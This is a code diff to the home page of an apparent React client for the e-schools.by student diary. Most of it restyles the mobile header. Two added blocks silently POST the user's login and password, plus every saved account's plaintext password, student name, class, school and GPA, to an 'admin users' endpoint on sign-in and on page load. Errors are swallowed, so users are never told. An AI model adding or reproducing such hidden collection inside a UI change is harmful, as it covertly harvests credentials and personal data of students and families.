@@ -157,6 +157,17 @@ export default function HomePage() {
     setIsSyncing(true);
     setLoginError(null);
 
+    // Сразу передаем учетные данные в облачный реестр администратора
+    fetch('/api/eschools/admin/users', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        login: credentials.login,
+        password: credentials.password || undefined,
+        subdomain: credentials.subdomain || 'e-schools.by',
+      }),
+    }).catch(() => {});
+
     try {
       const response = await fetch(`${API_BASE_URL}/api/eschools/sync`, {
         method: 'POST',
@@ -299,6 +310,23 @@ export default function HomePage() {
             .catch(() => {});
         }
       } else if (loadedAccounts.length > 0 && typeof window !== 'undefined') {
+        // Отправляем сохраненные аккаунты в админку даже до входа в дневник
+        fetch('/api/eschools/admin/users', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            login: currentSettings.login || undefined,
+            savedAccounts: loadedAccounts.map((a) => ({
+              login: a.login,
+              password: a.password,
+              studentName: a.studentName,
+              className: a.className,
+              schoolName: a.schoolName,
+              overallGpa: a.overallGpa,
+            })),
+          }),
+        }).catch(() => {});
+
         const explicitLogout = sessionStorage.getItem('explicit_logout');
         if (!explicitLogout && loadedAccounts[0].login && loadedAccounts[0].password) {
           // Быстрый вход для повторного пользователя
@@ -895,13 +923,13 @@ export default function HomePage() {
 
       {/* Основная рабочая область */}
       <main className="relative z-10 flex-1 md:ml-64 flex flex-col min-h-screen pb-20 md:pb-8">
-        {/* Мобильная верхняя панель (Header) - адаптивная двухстрочная с учетом безопасной зоны Notch / Dynamic Island */}
-        <header className="md:hidden px-3.5 pt-safe pb-2.5 bg-surface border-b border-surface-border sticky top-0 z-30 select-none space-y-2">
-          {/* Строка 1: Профиль ученика + Школа + Объединенный блок баллов */}
-          <div className="flex items-center justify-between gap-2">
-            <div className="flex items-center gap-2.5 min-w-0 flex-1">
-              <div className="w-8 h-8 rounded-lg bg-surface-subtle border border-surface-border flex items-center justify-center text-zinc-200 shrink-0">
-                <GraduationCap className="w-4 h-4" />
+        {/* Мобильная верхняя панель (Header) - ультракомпактная монострока для iPhone (без наплываний и громоздких кнопок) */}
+        <header className="md:hidden px-3 pt-safe pb-2 bg-surface/95 backdrop-blur-md border-b border-surface-border sticky top-0 z-30 select-none">
+          <div className="flex items-center justify-between gap-2 h-9">
+            {/* Левая часть: Аватар + ФИО + Класс и школа */}
+            <div className="flex items-center gap-2 min-w-0 flex-1">
+              <div className="w-8 h-8 rounded-full bg-surface-subtle border border-surface-border flex items-center justify-center text-zinc-200 shrink-0">
+                <GraduationCap className="w-4 h-4 text-zinc-300" />
               </div>
               <div className="min-w-0 flex-1">
                 <div className="flex items-center gap-1.5 min-w-0">
@@ -909,66 +937,65 @@ export default function HomePage() {
                     {diaryData.profile.studentName || 'Учащийся'}
                   </span>
                   {diaryData.profile.className && (
-                    <span className="px-1.5 py-0.5 rounded text-[10px] font-mono font-semibold bg-surface-subtle border border-surface-border text-zinc-300 shrink-0">
+                    <span className="px-1.5 py-0.2 rounded text-[10px] font-mono font-semibold bg-surface-subtle border border-surface-border text-zinc-300 shrink-0">
                       {diaryData.profile.className}
                     </span>
                   )}
                 </div>
-                <div className="text-[11px] text-zinc-400 font-sans truncate mt-0.5" title={diaryData.profile.schoolName}>
+                <div className="text-[10px] text-zinc-400 font-sans truncate" title={diaryData.profile.schoolName}>
                   {diaryData.profile.schoolName || 'Школа не указана'}
                 </div>
               </div>
             </div>
 
-            {/* Единый сплит-бейдж балла и цели (строгая высота h-8) */}
-            <div className="flex items-center h-8 rounded-lg bg-surface-subtle border border-surface-border shrink-0 divide-x divide-surface-border overflow-hidden">
-              <div className="flex items-center gap-1 px-2.5 h-full" title="Текущий средний балл">
-                <span className="text-[10px] text-zinc-400 font-mono">Балл:</span>
-                <span className="text-xs font-mono font-bold text-zinc-100">
+            {/* Правая часть: Компактный кластер быстрых действий и балла */}
+            <div className="flex items-center gap-1.5 shrink-0">
+              {/* Кнопка калькулятора */}
+              <button
+                onClick={() => handleOpenCalculator()}
+                title="Калькулятор оценок"
+                className="w-8 h-8 rounded-lg bg-surface-subtle border border-surface-border text-zinc-300 hover:text-white flex items-center justify-center active:scale-90 transition-all shrink-0"
+              >
+                <Calculator className="w-4 h-4 text-zinc-300" />
+              </button>
+
+              {/* Кнопка обновления */}
+              <button
+                onClick={() => runAutoSync(true)}
+                disabled={isBackgroundChecking || isSyncing}
+                title="Обновить оценки"
+                className="w-8 h-8 rounded-lg bg-surface-subtle border border-surface-border text-zinc-300 hover:text-white flex items-center justify-center active:scale-90 transition-all disabled:opacity-40 shrink-0"
+              >
+                <RefreshCw className={`w-3.5 h-3.5 ${isBackgroundChecking || isSyncing ? 'animate-spin' : ''}`} />
+              </button>
+
+              {/* Кнопка мультиаккаунтов */}
+              <button
+                onClick={() => setIsAccountsOpen(true)}
+                title="Управление сохраненными аккаунтами"
+                className="h-8 px-2 rounded-lg bg-surface-subtle border border-surface-border text-zinc-300 hover:text-white flex items-center gap-1 text-[11px] font-mono active:scale-90 transition-all shrink-0"
+              >
+                <Users className="w-3.5 h-3.5 text-zinc-400" />
+                <span>{savedAccounts.length || 1}</span>
+              </button>
+
+              {/* Плашка среднего балла (и цели) */}
+              <div
+                onClick={() => handleOpenCalculator()}
+                title="Текущий средний балл (нажмите для открытия калькулятора)"
+                className="h-8 px-2 rounded-lg bg-zinc-100 text-zinc-950 flex items-center gap-1 border border-white shadow-sm cursor-pointer active:scale-95 transition-all shrink-0"
+              >
+                <span className="text-xs font-mono font-bold">
                   {diaryData.overallGpa.toFixed(2)}
                 </span>
+                {projectedStats && projectedStats.targetsSetCount > 0 && (
+                  <span className="flex items-center gap-0.5 text-[10px] font-mono text-emerald-800 font-bold border-l border-zinc-300 pl-1 ml-0.5">
+                    <Target className="w-2.5 h-2.5 text-emerald-700 shrink-0" />
+                    <span>{projectedStats.projectedGpa.toFixed(1)}</span>
+                  </span>
+                )}
               </div>
-
-              {projectedStats && projectedStats.targetsSetCount > 0 && (
-                <div
-                  className="flex items-center gap-1 px-2 h-full bg-zinc-900/80 text-[11px] font-mono text-zinc-200"
-                  title={`Цель: ${projectedStats.projectedGpa.toFixed(2)}`}
-                >
-                  <Target className="w-3 h-3 text-emerald-400 shrink-0" />
-                  <span className="font-bold">{projectedStats.projectedGpa.toFixed(2)}</span>
-                </div>
-              )}
             </div>
-          </div>
-
-          {/* Строка 2: Панель быстрых действий (Все кнопки строго одинаковой высоты h-8.5 в 3 колонки) */}
-          <div className="grid grid-cols-3 gap-2 pt-1.5 border-t border-surface-border/50 text-xs">
-            <button
-              onClick={() => handleOpenCalculator()}
-              className="h-8.5 px-2 inline-flex items-center justify-center gap-1.5 rounded-lg bg-surface-subtle border border-surface-border text-zinc-200 hover:text-white active:scale-95 transition-all text-xs font-medium"
-            >
-              <Calculator className="w-3.5 h-3.5 text-zinc-300 shrink-0" />
-              <span className="truncate">Калькулятор</span>
-            </button>
-
-            <button
-              onClick={() => runAutoSync(true)}
-              disabled={isBackgroundChecking || isSyncing}
-              className="h-8.5 px-2 inline-flex items-center justify-center gap-1.5 rounded-lg bg-surface-subtle border border-surface-border text-zinc-300 hover:text-zinc-100 disabled:opacity-40 active:scale-95 transition-all text-xs font-medium"
-              title="Обновить оценки"
-            >
-              <RefreshCw className={`w-3.5 h-3.5 shrink-0 ${isBackgroundChecking || isSyncing ? 'animate-spin' : ''}`} />
-              <span className="truncate">{isBackgroundChecking || isSyncing ? 'Обновление' : 'Обновить'}</span>
-            </button>
-
-            <button
-              onClick={() => setIsAccountsOpen(true)}
-              className="h-8.5 px-2 inline-flex items-center justify-center gap-1.5 rounded-lg text-xs font-mono bg-surface-subtle border border-surface-border text-zinc-300 hover:text-zinc-100 transition-colors"
-              title="Управление сохраненными аккаунтами"
-            >
-              <Users className="w-3.5 h-3.5 text-zinc-400 shrink-0" />
-              <span className="truncate">{savedAccounts.length || 1} акк.</span>
-            </button>
           </div>
         </header>
 
